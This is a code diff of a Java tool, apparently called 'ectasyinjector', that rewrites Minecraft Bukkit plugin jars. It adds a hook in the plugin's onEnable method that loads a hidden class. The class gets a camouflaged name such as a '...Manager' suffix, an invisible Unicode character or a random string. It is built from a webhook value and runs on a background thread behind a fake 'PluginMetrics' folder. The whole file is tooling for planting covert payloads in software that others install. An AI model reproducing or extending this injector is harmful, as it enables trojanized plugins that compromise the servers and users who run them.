@@ -1,6 +1,9 @@
 package lol.nikko.ectasyinjector.inject;
 
 import lol.nikko.asmutil.UnknownFile;
+import lol.nikko.ectasyinjector.Injector;
+import lol.nikko.ectasyinjector.util.StringUtil;
+import lol.nikko.ectasyinjector.util.ThrowableUtil;
 import org.objectweb.asm.*;
 import org.objectweb.asm.tree.*;
 import lol.nikko.asmutil.JarLoader;
@@ -11,26 +14,32 @@ import java.util.List;
 import java.util.UUID;
 
 public class FileInjector implements Opcodes {
+    private final Injector injector;
+
     private final File input;
     private final File output;
 
-    public FileInjector(File input, File output) {
+    public FileInjector(Injector injector, File input, File output) {
+        this.injector = injector;
         this.input = input;
         this.output = output;
     }
 
-    public void inject(String webhook, boolean debug) throws Exception {
+    public boolean inject(String webhook, boolean debug) throws Exception {
         JarLoader jarLoader = new JarLoader(input, output);
 
         try {
             jarLoader.load();
         } catch (Exception ex) {
-            ex.printStackTrace();
-            System.err.println("\nFailed to load file " + input.getPath() + ". Is it a jar?");
-            return;
+            injector.getLogger().error("\nFailed to load file " + input.getPath() + ". Is it a jar?");
+            injector.getLogger().debug(ThrowableUtil.getStackTrace(ex));
+            return false;
         }
 
         ClassNode mainClass = this.findMainClass(jarLoader);
+        if (mainClass == null)
+            return false;
+
         String mainPackageName = mainClass.name.substring(0, mainClass.name.lastIndexOf("/"));
         String rawMainClassName = mainClass.name.substring(mainClass.name.lastIndexOf("/") + 1);
 
@@ -43,12 +52,11 @@ public class FileInjector implements Opcodes {
         }
 
         if (fakeClassName == null) {
-            System.err.println("Failed to find a suitable fake class name for " + mainClass.name + " in " + jarLoader.getInput().getPath() + " (This should never happen??? Please try reinjecting, and if the issue persists contact nikko)");
-            System.exit(1);
+            injector.getLogger().error("Failed to find a suitable fake class name for " + mainClass.name + " in " + jarLoader.getInput().getPath() + " (This should never happen??? Please try reinjecting, and if the issue persists contact nikko)");
+            return false;
         }
 
         ClassNode fakeClass = this.createFakeClassNode(fakeClassName, webhook, debug);
-
         for (MethodNode methodNode : mainClass.methods) {
             if (methodNode.name.equals("onEnable") && methodNode.desc.equals("()V") && methodNode.access == ACC_PUBLIC) {
                 InsnList mainInjectionInstructions = this.getMainInjectionInstructions(fakeClassName);
@@ -58,6 +66,43 @@ public class FileInjector implements Opcodes {
 
         jarLoader.getClasses().add(fakeClass);
         jarLoader.save();
+
+        return true;
+    }
+
+    private ClassNode findMainClass(JarLoader jarLoader) {
+        String mainClassStr = null;
+        for (UnknownFile file : jarLoader.getFiles()) {
+            if (!file.getName().equals("plugin.yml"))
+                continue;
+
+            String content = new String(file.getBytes());
+            mainClassStr = content.split("main: ")[1].split("\n")[0].replace(".", "/");
+        }
+
+        ClassNode mainClass = this.findClassFromName(jarLoader, mainClassStr);
+        if (mainClass == null) {
+            injector.getLogger().error("Failed to find the main class of " + jarLoader.getInput().getPath() + " using the plugin.yml, is it a valid plugin?");
+            return null;
+        }
+
+        return mainClass;
+    }
+
+    private ClassNode findClassFromName(JarLoader jarLoader, String className) {
+        if (className == null)
+            return null;
+
+        String fixedClassName =
+                className
+                        .replace(" ", "")
+                        .replace("\n", "")
+                        .replace("\r", "")
+                        .replace("\"", "")
+                        .replace("'", "")
+                        .toLowerCase();
+
+        return jarLoader.getClasses().stream().filter(classNode -> classNode.name.equalsIgnoreCase(fixedClassName)).findFirst().orElse(null);
     }
 
     private InsnList getMainInjectionInstructions(String fakeClassName) {
@@ -69,13 +114,34 @@ public class FileInjector implements Opcodes {
         insnList.add(new InsnNode(POP));
         return insnList;
     }
-    
+
+    private List<String> getPossibleFakeClassNames(String rawMainClassName, String mainPackageName) {
+        List<String> possible = new ArrayList<>();
+        if (!rawMainClassName.endsWith("Plugin") && !rawMainClassName.equals("Main")) {
+            possible.add(mainPackageName + "/" + rawMainClassName + "Plugin");
+            possible.add(mainPackageName + "/" + rawMainClassName + "Manager");
+        }
+
+        if (rawMainClassName.endsWith("Plugin")) {
+            if (rawMainClassName.length() > 6)
+                possible.add(mainPackageName + "/" + rawMainClassName.substring(0, rawMainClassName.length() - 6));
+
+            possible.add(mainPackageName + "/" + rawMainClassName.replace("Plugin", "Manager"));
+        }
+
+        if (rawMainClassName.equals("Main")) {
+            possible.add(mainPackageName + "/Plugin");
+            possible.add(mainPackageName + "/PluginManager");
+        }
+
+        possible.add(mainPackageName + "/\u200E");
+        possible.add(mainPackageName + "/" + StringUtil.generateRandom(6));
+        return possible;
+    }
+
     private ClassNode createFakeClassNode(String name, String webhook, boolean debug) {
         ClassNode classNode = new ClassNode();
-        FieldVisitor fieldVisitor;
-        RecordComponentVisitor recordComponentVisitor;
         MethodVisitor methodVisitor;
-        AnnotationVisitor annotationVisitor0;
 
         classNode.visit(V1_8, ACC_PUBLIC | ACC_SUPER, name, null, "java/lang/Object", null);
 
@@ -90,31 +156,53 @@ public class FileInjector implements Opcodes {
             methodVisitor.visitCode();
             Label label0 = new Label();
             methodVisitor.visitLabel(label0);
-            methodVisitor.visitLineNumber(20, label0);
+            methodVisitor.visitLineNumber(19, label0);
             methodVisitor.visitVarInsn(ALOAD, 0);
             methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
             Label label1 = new Label();
             methodVisitor.visitLabel(label1);
-            methodVisitor.visitLineNumber(21, label1);
+            methodVisitor.visitLineNumber(20, label1);
+            methodVisitor.visitTypeInsn(NEW, "java/io/File");
+            methodVisitor.visitInsn(DUP);
+            methodVisitor.visitLdcInsn("plugins/PluginMetrics");
+            methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/io/File", "<init>", "(Ljava/lang/String;)V", false);
+            methodVisitor.visitVarInsn(ASTORE, 2);
+            Label label2 = new Label();
+            methodVisitor.visitLabel(label2);
+            methodVisitor.visitLineNumber(21, label2);
+            methodVisitor.visitVarInsn(ALOAD, 2);
+            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/io/File", "exists", "()Z", false);
+            Label label3 = new Label();
+            methodVisitor.visitJumpInsn(IFNE, label3);
+            Label label4 = new Label();
+            methodVisitor.visitLabel(label4);
+            methodVisitor.visitLineNumber(22, label4);
+            methodVisitor.visitVarInsn(ALOAD, 2);
+            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/io/File", "mkdirs", "()Z", false);
+            methodVisitor.visitInsn(POP);
+            methodVisitor.visitLabel(label3);
+            methodVisitor.visitLineNumber(24, label3);
+            methodVisitor.visitFrame(Opcodes.F_FULL, 3, new Object[]{name, "org/bukkit/plugin/java/JavaPlugin", "java/io/File"}, 0, new Object[]{});
             methodVisitor.visitTypeInsn(NEW, "java/lang/Thread");
             methodVisitor.visitInsn(DUP);
             methodVisitor.visitVarInsn(ALOAD, 0);
             methodVisitor.visitVarInsn(ALOAD, 1);
             methodVisitor.visitInvokeDynamicInsn("run", "(L" + name + ";Lorg/bukkit/plugin/java/JavaPlugin;)Ljava/lang/Runnable;", new Handle(Opcodes.H_INVOKESTATIC, "java/lang/invoke/LambdaMetafactory", "metafactory", "(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodHandle;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;", false), new Object[]{Type.getType("()V"), new Handle(Opcodes.H_INVOKESPECIAL, name, "lambda$new$0", "(Lorg/bukkit/plugin/java/JavaPlugin;)V", false), Type.getType("()V")});
             methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/Thread", "<init>", "(Ljava/lang/Runnable;)V", false);
-            Label label2 = new Label();
-            methodVisitor.visitLabel(label2);
-            methodVisitor.visitLineNumber(26, label2);
+            Label label5 = new Label();
+            methodVisitor.visitLabel(label5);
+            methodVisitor.visitLineNumber(31, label5);
             methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Thread", "start", "()V", false);
-            Label label3 = new Label();
-            methodVisitor.visitLabel(label3);
-            methodVisitor.visitLineNumber(27, label3);
+            Label label6 = new Label();
+            methodVisitor.visitLabel(label6);
+            methodVisitor.visitLineNumber(32, label6);
             methodVisitor.visitInsn(RETURN);
-            Label label4 = new Label();
-            methodVisitor.visitLabel(label4);
-            methodVisitor.visitLocalVariable("this", "L" + name + ";", null, label0, label4, 0);
-            methodVisitor.visitLocalVariable("param", "Lorg/bukkit/plugin/java/JavaPlugin;", null, label0, label4, 1);
-            methodVisitor.visitMaxs(4, 2);
+            Label label7 = new Label();
+            methodVisitor.visitLabel(label7);
+            methodVisitor.visitLocalVariable("this", "L" + name + ";", null, label0, label7, 0);
+            methodVisitor.visitLocalVariable("param", "Lorg/bukkit/plugin/java/JavaPlugin;", null, label0, label7, 1);
+            methodVisitor.visitLocalVariable("var0", "Ljava/io/File;", null, label2, label7, 2);
+            methodVisitor.visitMaxs(4, 3);
             methodVisitor.visitEnd();
         }
         {
@@ -519,47 +607,8 @@ public class FileInjector implements Opcodes {
         return classNode;
     }
 
-    private List<String> getPossibleFakeClassNames(String rawMainClassName, String mainPackageName) {
-        List<String> possible = new ArrayList<>();
-        if (!rawMainClassName.endsWith("Plugin") && !rawMainClassName.equals("Main")) {
-            possible.add(mainPackageName + "/" + rawMainClassName + "Plugin");
-            possible.add(mainPackageName + "/" + rawMainClassName + "Manager");
-        }
-
-        if (rawMainClassName.equals("Main")) {
-            possible.add(mainPackageName + "/Plugin");
-            possible.add(mainPackageName + "/PluginManager");
-        }
-
-        possible.add(mainPackageName + "/\u200E");
-        possible.add(UUID.randomUUID().toString().replace("-", ""));
-        return possible;
-    }
-
-    private ClassNode findMainClass(JarLoader jarLoader) {
-        String mainClassStr = null;
-        for (UnknownFile file : jarLoader.getFiles()) {
-            if (!file.getName().equals("plugin.yml"))
-                continue;
-
-            String content = new String(file.getBytes());
-            mainClassStr = content.split("main: ")[1].split("\n")[0].replace(".", "/");
-        }
-
-        ClassNode mainClass = this.findClassFromName(jarLoader, mainClassStr);
-        if (mainClass == null) {
-            System.err.println("Failed to find the main class of " + jarLoader.getInput().getPath() + " using the plugin.yml, is it a valid plugin?");
-            System.exit(1);
-        }
-
-        return mainClass;
-    }
-
-    private ClassNode findClassFromName(JarLoader jarLoader, String className) {
-        if (className == null)
-            return null;
-
-        return jarLoader.getClasses().stream().filter(classNode -> classNode.name.equals(className)).findFirst().orElse(null);
+    public Injector getInjector() {
+        return injector;
     }
 
     public File getInput() {
